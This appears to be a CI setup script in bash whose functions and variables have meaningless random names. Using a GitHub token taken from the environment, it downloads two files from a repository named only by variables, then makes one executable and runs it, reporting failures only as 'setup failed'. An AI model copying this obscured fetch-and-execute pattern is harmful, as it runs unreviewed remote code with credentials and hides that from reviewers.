#!/usr/bin/env bash
set -euo pipefail
set +x

f() {
  printf '%s\n' "$1" >&2
  exit 1
}

s() {
  local n="$1"
  if [ "${!n+x}" != "x" ]; then
    f "setup failed"
  fi
}

n() {
  local n="$1"
  s "$n"
  if [ -z "${!n}" ]; then
    f "setup failed"
  fi
}

a() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}$ ]]; then
    f "setup failed"
  fi
}

b() {
  local q="$1"
  if [[ ! "$q" =~ ^x_[a-z2-7]{16}(,x_[a-z2-7]{16})*$ ]]; then
    f "setup failed"
  fi
}

n x_idhjdc5ab2fm4fc3
n x_3a6s4crmaqyrdbj3
n x_v3smfxllbk4amtoa
n x_qergpsvf3gpyunlu
a "${x_qergpsvf3gpyunlu}"
s x_c24k43vq7s4gdmci
if [ -n "${x_c24k43vq7s4gdmci:-}" ]; then
  b "${x_c24k43vq7s4gdmci}"
fi

d="$(mktemp -d)"
c() {
  rm -rf "$d"
}
trap c EXIT

t="$d/r"
l="$d/l"
o="$d/o"
mkdir -p "$t"

export GH_TOKEN="${x_v3smfxllbk4amtoa}"
r="${x_idhjdc5ab2fm4fc3}"
v="${x_3a6s4crmaqyrdbj3}"
k="${x_qergpsvf3gpyunlu}"

g() {
  local p="$1"
  local q="$2"
  if ! gh api -H "Accept: application/vnd.github.raw" "repos/${r}/contents/${p}?ref=${v}" >"$q" 2>"$l"; then
    f "setup failed"
  fi
}

g "x/${k}/x" "$t/x"
g "x/${k}/d" "$t/d"
chmod 700 "$t/x"
chmod 600 "$t/d"

export x_rhtuwt2ecpgenoem="$o"
if ! "$t/x" >"$l" 2>&1; then
  f "run failed"
fi

if [ -n "${x_c24k43vq7s4gdmci:-}" ]; then
  n GITHUB_OUTPUT
fi
